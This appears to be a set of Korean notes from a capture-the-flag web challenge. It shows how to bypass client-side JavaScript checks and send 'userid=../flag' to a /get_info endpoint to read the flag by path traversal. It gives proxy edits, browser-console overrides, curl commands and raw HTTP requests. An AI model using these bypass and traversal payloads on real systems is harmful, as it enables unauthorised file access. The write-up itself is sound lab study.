@@ -1,0 +1,89 @@
+크롬 개발자 툴로 코드를 보면 jaavscript에서 guest와 admin 값을 0과 1로 변환시킨다.
+
+Proxy 툴을 사용한다
+    1) Get User Info 페이지로 들어가서 userid를 확인한다
+    2) guest나 admin 입력시 guest는 0, admin은 1로 변한뒤 값이 입력되는 걸 볼 수있다
+    3) 코드를 보면 guest와 admin의 값이다
+    4) 원하는 건 flag이므로 Path Travesal 방식을 사용 ../flag를 사용해야된다
+    5) 그냥 입력시 ../flag는 undefine으로 변환되어 입력된다
+    6) Proxy 툴을 사용해 중간에 패킷을 가져와 userid = undefine중 undefine을 ../flag로 바꿔준다
+    7) 변환된 패킷을 전송하면 Flag를 획득할 수 있다.
+
+Chrome Console
+    1) 콘솔창을 연다
+    2) user의 정보를 바꾼다
+    3) guest나 admin중 하나의 값을 바꾼다
+    4) users["admin"] = "../flag" or user.admin = "../flag"
+    5) admin을 입력해주면 flag 획득
+
+파이썬 request 모듈 사용
+
+즉 결국 ../flag란 값을 정삭적으로 서버에 보내면 된다
+
+curl -X POST “http://host1.dreamhack.games:23112/get_info” -d “userid=…/flag”
+
+../flag를 통해 File Traversal 공격을 수행해야 하지만,
+
+JS에서 users 배열을 이용해 검사하기 때문에 페이지에서 직접 submit 버튼을 누르는 것이 아니라
+
+작업 관리자의 console로 이동해
+document.getElementById('form').submit() // submit 스크립트 실행전에 먼저 실행 되는것 같다
+를 입력해서 인자를 전달해준다.
+
+path traversal을 이용해 /api/flag에 접근해야하지만, javascript를 통해 userid를 검사하게 된다. 이 필터링을 해제하기 위해
+document.getElementById('form').removeEventListener('submit', user); 이 명령어를 콘솔창에 입력하여 해제시켜준 뒤에 …/flag를 입력해주면 flag가 정상적으로 출력된다.
+
+2020.12.14. 10:42
+
+curl http://host1.dreamhack.games:20134/get_info -d ‘userid=…/flag’ | grep DH
+
+guest 계정의 정보 조회
+파라미터 값 0으로 반환되면서 그 뒤에 세미콜론(;)과 /api/flag 입력
+에러가 발생하지만 …/를 지속적으로 붙이다보면 flag값 추출
+
+결국 서버에 정확한 값을 전송해야하는 것
+
+리눅스 curl, 파이썬 request 등등
+
+
+
+
+
+
+
+나중에 프록시랑 비교
+
+문제 소스 코드를 보면 /get_info 에서 POST로 요청을 하였을 때 userid의 값을 가지고 아래의 내용으로 필드를 채워 요청을 하는 대 이때 요청하는 데이터에 대한 검증이 없어 다른 곳으로 pathTravel이 가능 하다 . /get_info 에서 Script를 이용하여 guest는 0으로 admin 는 1로 치환하고 있는데 클라이언트 단에서 처리를 하기 때문에 스크립트를 무시하고 강제적으로 ../flag 를 전송 하면 된다.
+
+POST /get_info HTTP/1.1
+Host: host1.dreamhack.games:8208
+Content-Length: 8
+Cache-Control: max-age=0
+Origin: http://host1.dreamhack.games:8208
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://host1.dreamhack.games:8208/get_info
+Accept-Encoding: gzip, deflate
+Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+userid=../flag
+
+POST /get_info HTTP/1.1
+Host: host1.dreamhack.games:8224
+Content-Length: 14
+Cache-Control: max-age=0
+Origin: http://host1.dreamhack.games:8224
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://host1.dreamhack.games:8224/get_info
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: username=admin
+Connection: close
+
+userid=../flag
